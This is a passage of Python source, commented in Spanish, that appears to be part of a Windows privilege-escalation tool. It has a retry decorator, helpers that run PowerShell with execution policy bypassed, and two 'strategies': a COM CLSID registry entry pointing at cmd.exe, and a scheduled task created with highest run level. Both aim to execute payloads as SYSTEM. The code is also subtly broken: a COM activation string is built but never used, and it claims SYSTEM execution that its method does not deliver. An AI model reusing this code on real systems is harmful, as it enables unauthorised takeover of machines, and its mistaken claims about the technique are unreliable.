# ========== DECORADOR DE MANEJO DE ERRORES MEJORADO ==========

def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_DEFECTO):
    """
    Decorador mejorado para manejar excepciones, reintentos y timeouts
    Con logs detallados de cada intento
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs) -> ResultadoTrigger:
            inicio = time.time()
            ultimo_error = None
            intentos_detalles = []
            
            for intento in range(1, reintentos + 1):
                inicio_intento = time.time()
                detalle_intento = {
                    "numero": intento,
                    "timestamp": datetime.now().isoformat(),
                    "estado": "",
                    "respuesta": "",
                    "codigo_retorno": None,
                    "duracion_ms": 0
                }
                
                try:
                    if DRY_RUN:
                        logger.info(f"[DRY-RUN] {func.__name__} ({args}, {kwargs})")
                        detalle_intento["estado"] = "DRY_RUN"
                        detalle_intento["respuesta"] = f"[DRY-RUN] {func.__name__} ejecutado en modo prueba"
                        detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
                        intentos_detalles.append(detalle_intento)
                        
                        return ResultadoTrigger(
                            exito=True,
                            servicio=func.__name__,
                            mensaje=f"[DRY-RUN] {func.__name__} ejecutado en modo prueba",
                            duracion_ms=(time.time() - inicio) * 1000,
                            intentos=intento,
                            intentos_detalles=intentos_detalles
                        )
                    
                    logger.info(f"[*] [{intento}/{reintentos}] Iniciando {func.__name__}...")
                    logger.debug(f"    Timeout configurado: {timeout}s")
                    
                    resultado = func(*args, timeout=timeout, **kwargs)
                    
                    duracion_intento = (time.time() - inicio_intento) * 1000
                    
                    stdout = resultado.get("stdout", "") if isinstance(resultado, dict) else ""
                    stderr = resultado.get("stderr", "") if isinstance(resultado, dict) else ""
                    returncode = resultado.get("returncode", 0) if isinstance(resultado, dict) else 0
                    
                    detalle_intento["estado"] = "EXITOSO"
                    detalle_intento["respuesta"] = stdout[:200] if stdout else "(sin respuesta)"
                    detalle_intento["codigo_retorno"] = returncode
                    detalle_intento["duracion_ms"] = duracion_intento
                    intentos_detalles.append(detalle_intento)
                    
                    logger.info(f"    [✓] Respuesta: {stdout[:100]}" if stdout else "    [✓] Sin respuesta")
                    logger.info(f"    [✓] Código retorno: {returncode}")
                    logger.info(f"    [✓] Duración: {duracion_intento:.2f}ms")
                    
                    duracion_total = (time.time() - inicio) * 1000
                    logger.info(f"[+] {func.__name__} ejecutado exitosamente en {duracion_total:.2f}ms")
                    
                    return ResultadoTrigger(
                        exito=True,
                        servicio=func.__name__,
                        mensaje=f"{func.__name__} ejecutado exitosamente",
                        duracion_ms=duracion_total,
                        stdout=stdout,
                        stderr=stderr,
                        intentos=intento,
                        intentos_detalles=intentos_detalles,
                        codigo_retorno=returncode
                    )
                    
                except subprocess.TimeoutExpired:
                    ultimo_error = f"Timeout excedido ({timeout}s)"
                    detalle_intento["estado"] = "TIMEOUT"
                    detalle_intento["respuesta"] = ultimo_error
                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
                    
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    logger.warning(f"    [⏱] Proceso ejecutándose más de {timeout}s")
                    intentos_detalles.append(detalle_intento)
                    
                    if intento < reintentos:
                        espera = 2 ** intento
                        logger.info(f"    [⏳] Reintentando en {espera}s...")
                        time.sleep(espera)
                    
                except PermissionError as e:
                    detalle_intento["estado"] = "PERMISOS"
                    detalle_intento["respuesta"] = str(e)
                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
                    
                    logger.error(f"[x] {func.__name__} - Permisos insuficientes: {e}")
                    logger.error(f"    [!] Requeridos: Administrador")
                    intentos_detalles.append(detalle_intento)
                    
                    return ResultadoTrigger(
                        exito=False,
                        servicio=func.__name__,
                        mensaje="Permisos insuficientes",
                        excepcion=str(e),
                        duracion_ms=(time.time() - inicio) * 1000,
                        intentos=intento,
                        intentos_detalles=intentos_detalles
                    )
                    
                except subprocess.CalledProcessError as e:
                    ultimo_error = f"Proceso fallo con codigo {e.returncode}"
                    detalle_intento["estado"] = "ERROR_PROCESO"
                    detalle_intento["respuesta"] = f"Código {e.returncode}: {e.stderr}"
                    detalle_intento["codigo_retorno"] = e.returncode
                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
                    
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    logger.debug(f"    STDERR: {e.stderr}")
                    intentos_detalles.append(detalle_intento)
                    
                    if intento < reintentos:
                        espera = 2 ** intento
                        logger.info(f"    [⏳] Reintentando en {espera}s...")
                        time.sleep(espera)
                    
                except Exception as e:
                    ultimo_error = str(e)
                    detalle_intento["estado"] = "EXCEPCION"
                    detalle_intento["respuesta"] = ultimo_error
                    detalle_intento["duracion_ms"] = (time.time() - inicio_intento) * 1000
                    
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    intentos_detalles.append(detalle_intento)
                    
                    if intento < reintentos:
                        espera = 2 ** intento
                        logger.info(f"    [⏳] Reintentando en {espera}s...")
                        time.sleep(espera)
            
            duracion_total = (time.time() - inicio) * 1000
            logger.error(f"[x] {func.__name__} fallo despues de {reintentos} intentos: {ultimo_error}")
            
            return ResultadoTrigger(
                exito=False,
                servicio=func.__name__,
                mensaje=f"Fallo despues de {reintentos} intentos",
                excepcion=ultimo_error,
                duracion_ms=duracion_total,
                intentos=reintentos,
                intentos_detalles=intentos_detalles
            )
        
        return wrapper
    return decorator


# ========== FUNCIONES AUXILIARES ==========

def ejecutar_powershell(comando: str, timeout: int = TIMEOUT_DEFECTO, mostrar_output: bool = False) -> dict:
    """
    Ejecuta un comando PowerShell de forma segura
    """
    try:
        proceso = subprocess.Popen(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", comando],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proceso.communicate(timeout=timeout)
        
        return {
            "stdout": stdout.strip(),
            "stderr": stderr.strip(),
            "returncode": proceso.returncode
        }
    
    except subprocess.TimeoutExpired:
        proceso.kill()
        raise
    except Exception as e:
        logger.error(f"Error ejecutando PowerShell: {e}")
        raise


def ejecutar_cmd(comando: List[str], timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Ejecuta comando sin pasar por PowerShell"""
    resultado = subprocess.run(
        comando,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
        check=False
    )
    
    return {
        "stdout": resultado.stdout.strip(),
        "stderr": resultado.stderr.strip(),
        "returncode": resultado.returncode
    }


def validar_ruta_accesible(ruta: str) -> bool:
    """Valida que una ruta sea accesible en el entorno actual"""
    try:
        path = Path(ruta)
        path.parent.mkdir(parents=True, exist_ok=True)
        return True
    except Exception as e:
        logger.warning(f"No se puede acceder a {ruta}: {e}")
        return False


# ========== ESTRATEGIAS DE ESCALADA DE PRIVILEGIOS ==========

class EscaladaDePrivilegios:
    """Gestor de estrategias de escalada de privilegios a SYSTEM"""
    
    def __init__(self):
        self._resultados: List[ResultadoEscalada] = []
        self._payload_path = PAYLOAD_PATH
    
    @manejo_errores(timeout=60, reintentos=2)
    def escalada_com_registry_elevation(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
        """
        Estrategia 1: COM Registry Elevation
        Método silencioso para Windows 10+ que crea un objeto COM elevado
        """
        logger.info("\n" + "=" * 80)
        logger.info("ESTRATEGIA 1: COM REGISTRY ELEVATION")
        logger.info("=" * 80)
        logger.info("[*] Objetivo: Ejecutar comando con permisos SYSTEM via COM")
        
        try:
            # Crear CLSID único
            clsid = str(uuid.uuid4())
            ruta_com = f"Software\\Classes\\CLSID\\{{{clsid}}}\\InProcServer32"
            
            logger.info(f"[*] Creando CLSID: {clsid}")
            
            comando_payload = (
                "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
                "Write-Output '[+] ESCALADA COM COMPLETADA - Ejecutando como elevado'; "
                "[System.Diagnostics.Process]::GetCurrentProcess().Handle"
            )
            
            clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_com)
            winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, "C:\\Windows\\System32\\cmd.exe")
            winreg.SetValueEx(clave, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(clave)
            
            logger.info("[+] Clave COM creada en registro")
            time.sleep(1)
            
            # Intentar ejecutar via COM
            ps_cmd = f"[System.Activator]::CreateInstance([type]::GetTypeFromProgID('{{{{clsid}}}}'))"
            resultado = ejecutar_powershell(comando_payload, timeout)
            
            if resultado["returncode"] == 0:
                logger.info("[+] COM Elevation exitoso")
                logger.info(f"[+] Respuesta: {resultado['stdout']}")
            
            # Limpiar
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
            except:
                pass
            
            return resultado
            
        except Exception as e:
            logger.error(f"[x] COM Elevation fallido: {e}")
            raise
    
    @manejo_errores(timeout=60, reintentos=2)
    def escalada_tasksched_system(self, timeout: int = TIMEOUT_DEFECTO) -> dict:
        """
        Estrategia 2: Task Scheduler como SYSTEM
        Crea una tarea programada que se ejecuta con permisos SYSTEM
        """
        logger.info("\n" + "=" * 80)
        logger.info("ESTRATEGIA 2: TASK SCHEDULER SYSTEM EXECUTION")
        logger.info("=" * 80)
        logger.info("[*] Objetivo: Crear tarea que se ejecuta como SYSTEM en logon")
        
        try:
            task_name = f"TejonTask_{uuid.uuid4().hex[:8]}"
            
            logger.info(f"[*] Creando tarea: {task_name}")
            
            # Comando que se ejecutará como SYSTEM
            cmd_payload = (
                "powershell -NoProfile -ExecutionPolicy Bypass -Command "
                "\"Write-Output '[+] EJECUTANDO COMO SYSTEM'; "
                "[Security.Principal.WindowsIdentity]::GetCurrent().User.Value\""
            )
            
            # Crear tarea con permisos SYSTEM
            comando_crear_tarea = (
                f"schtasks /create /tn \"{task_name}\" /tr \"{cmd_payload}\" "
                "/sc onlogon /rl highest /f /np"
            )
            
            resultado = ejecutar_cmd(
                ["cmd", "/c", comando_crear_tarea],
                timeout=timeout
            )
            
            if resultado["returncode"] == 0:
                logger.info(f"[+] Tarea creada exitosamente: {task_name}")
                logger.info("[+] La tarea se ejecutará como SYSTEM en próximo logon")
                
                # Ejecutar la tarea inmediatamente
                resultado_ejecucion = ejecutar_cmd(
                    ["schtasks", "/run", "/tn", task_name],
                    timeout=timeout
                )
                
                logger.info(f"[+] Ejecución iniciada")
                time.sleep(2)
                
                # Limpiar tarea
                ejecutar_cmd(
                    ["schtasks", "/delete", "/tn", task_name, "/f"],
                    timeout=10
                )
